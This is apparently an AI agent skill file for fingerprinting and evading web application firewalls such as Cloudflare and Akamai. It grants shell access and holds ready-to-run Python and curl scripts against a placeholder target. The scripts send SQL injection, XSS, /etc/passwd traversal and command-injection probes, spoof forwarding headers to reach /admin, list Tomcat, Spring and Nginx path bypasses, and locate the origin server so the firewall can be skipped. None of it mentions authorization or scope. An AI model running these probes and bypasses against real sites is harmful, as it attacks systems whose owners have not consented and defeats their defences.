---
name: web-waf-detection
description: "Web Application Firewall fingerprinting — Cloudflare, AWS WAF, Akamai, Imperva, etc."
allowed-tools: Bash Read Write
metadata:
  subdomain: reconnaissance
  when_to_use: "WAF detection, wafw00f, Cloudflare, AWS WAF, Akamai, Imperva, web shield"
  tags: waf-detection
  mitre_attack: T1592.004
---

# WAF Detection, Fingerprinting & Evasion Suite

Identify front-end protection shields (Cloudflare, AWS WAF, Akamai, Imperva, Cloudfront) and execute precision evasion and origin discovery.

---

## 1. Automated WAF Fingerprinting

```bash
# 1. Active WAF identification
wafw00f https://<TARGET> -o /workspace/waf_<TARGET>.json -f json

# 2. Response header & trigger pattern inspection
python3 - <<'PY'
from curl_cffi import requests as r
import sys, re

target = "https://<TARGET>"
trigger_payloads = [
    ("normal", "/"),
    ("sqli", "/?id=1' OR '1'='1"),
    ("xss", "/?q=<script>alert(1)</script>"),
    ("lfi", "/?file=../../../../etc/passwd"),
    ("cmdi", "/?cmd=id;whoami")
]

print(f"[WAF-PROBE] Fingerprinting {target}")
for name, path in trigger_payloads:
    try:
        resp = r.get(f"{target}{path}", impersonate="chrome", timeout=10)
        server = resp.headers.get("server", "unknown")
        waf_headers = [f"{k}: {v}" for k, v in resp.headers.items() if any(w in k.lower() for w in ["cf-", "waf", "akamai", "imperva", "sucuri", "aws", "f5"])]
        print(f"  [{name:<6}] Status: {resp.status_code} | Server: {server} | WAF Flags: {waf_headers}")
    except Exception as e:
        print(f"  [{name:<6}] Blocked / Connection Reset: {e}")
PY
```

---

## 2. Advanced Evasion Techniques

### A. HTTP Header Spoofing (IP & Route Rewriting)
Test if origin trusts reverse-proxy forward headers:

```bash
python3 - <<'PY'
from curl_cffi import requests as r

target = "https://<TARGET>/admin"
headers_to_test = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"}
]

for h in headers_to_test:
    try:
        resp = r.get(target, headers=h, impersonate="chrome", timeout=8)
        print(f"Header: {h} -> Status: {resp.status_code} (Len: {len(resp.content)})")
    except Exception as e:
        pass
PY
```

### B. URL Path Normalization Evasion
Test parser discrepancies between WAF and backend app server:
- `/admin;` (Tomcat matrix parameter bypass)
- `/admin/..;/admin` (Spring/Tomcat path traversal)
- `/%2e%2e/admin` (URL encoded dot-dot-slash)
- `//admin//` (Nginx/Apache double slash normalization)

---

## 3. Origin IP Discovery (Bypassing WAF Completely)

If WAF blocks active scanning, find the real backend IP:

```bash
# 1. SSL Certificate SAN search on crt.sh
curl -s "https://crt.sh/?q=%25.<TARGET>&output=json" | jq -r '.[].name_value' | sort -u | head -20

# 2. Favicon MD5/Murmur3 Hash Search (Shodan / Censys queryable)
python3 - <<'PY'
import mmh3, requests, base64
try:
    response = requests.get('https://<TARGET>/favicon.ico', verify=False, timeout=5)
    favicon = base64.encodebytes(response.content)
    hash_val = mmh3.hash(favicon)
    print(f"[FAVICON HASH] http.favicon.hash:{hash_val}")
except Exception as e:
    print(f"Favicon hash failed: {e}")
PY
```

